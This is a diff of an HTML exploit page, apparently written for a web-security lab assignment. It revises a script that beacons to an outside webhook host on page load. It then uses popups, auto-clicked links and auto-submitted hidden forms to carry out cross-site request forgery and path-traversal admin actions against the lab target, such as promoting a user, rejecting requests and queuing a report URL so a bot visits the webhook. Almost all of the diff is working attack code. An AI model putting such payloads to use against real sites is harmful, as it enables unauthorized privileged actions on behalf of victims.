@@ -3,12 +3,7 @@
 <head><meta charset="utf-8"></head>
 <body>
 <script>
-// v11: popup delivery + loop-back report POST.
-//   t=popweb      window.open(webhook /popup)                — popup capability probe
-//   t=popchall    window.open(challenge reject-injection)    — popup = top-level ctx -> Lax cookie attaches -> admin.js fires -> #7 flips
-//   t=anchchall   <a target=_blank>.click() same target      — alternative popup path
-//   t=formreport  auto-POST form -> challenge ?view=report   — report form has NO csrf; loop: server queues URL -> bot visits webhook /adminqueued
-//   (v8-v10 modes retained: reject/promote/aget/pjoseph/extnav/form*)
+// v13: adds t=beacon (pure beacon, NO navigation) for queue-timing oracles.
 var W    = 'https://peaceful-fish-56.webhook.cool';
 var BASE = 'https://10.20.18.55:2070/labs/assignment03/environment/1/';
 var q    = new URLSearchParams(location.search);
@@ -18,30 +13,8 @@ var tag  = mode + '-' + rid;
 
 try { fetch(W + '/c1?tag=' + encodeURIComponent(tag) + '&t=' + Date.now(), { keepalive: true, mode: 'no-cors' }); } catch (e) {}
 
-function submitPOST(action, fields) {
-  var f = document.createElement('form');
-  f.method = 'POST'; f.action = action;
-  for (var k in fields) {
-    var i = document.createElement('input');
-    i.type = 'hidden'; i.name = k; i.value = fields[k];
-    f.appendChild(i);
-  }
-  document.body.appendChild(f);
-  f.submit();
-}
-
-if (mode === 'popweb') {
-  window.open(W + '/popup');
-} else if (mode === 'popchall') {
-  window.open(BASE + '?view=admin&request=../requests/' + rid + '/reject?/seen');
-} else if (mode === 'anchchall') {
-  var a = document.createElement('a');
-  a.href = BASE + '?view=admin&request=../requests/' + rid + '/reject?/seen';
-  a.target = '_blank';
-  document.body.appendChild(a);
-  a.click();
-} else if (mode === 'formreport') {
-  submitPOST(BASE + '?view=report', { report_url: W + '/adminqueued' });
+if (mode === 'beacon') {
+  // nothing else — pure timing marker
 } else if (mode === 'formpromote' || mode === 'formapprove' || mode === 'formreject') {
   var action;
   if      (mode === 'formpromote') action = BASE + 'api/users/joseph/promote';
@@ -54,6 +27,24 @@ if (mode === 'popweb') {
   f.appendChild(i);
   document.body.appendChild(f);
   f.submit();
+} else if (mode === 'popweb') {
+  window.open(W + '/popup');
+} else if (mode === 'popchall') {
+  window.open(BASE + '?view=admin&request=../requests/' + rid + '/reject?/seen');
+} else if (mode === 'anchchall') {
+  var a = document.createElement('a');
+  a.href = BASE + '?view=admin&request=../requests/' + rid + '/reject?/seen';
+  a.target = '_blank';
+  document.body.appendChild(a);
+  a.click();
+} else if (mode === 'formreport') {
+  var fr = document.createElement('form');
+  fr.method = 'POST'; fr.action = BASE + '?view=report';
+  var ir = document.createElement('input');
+  ir.type = 'hidden'; ir.name = 'report_url'; ir.value = W + '/adminqueued';
+  fr.appendChild(ir);
+  document.body.appendChild(fr);
+  fr.submit();
 } else {
   var target;
   if      (mode === 'promote') { target = BASE + '?view=admin&request=../users/joseph/promote?/seen'; }
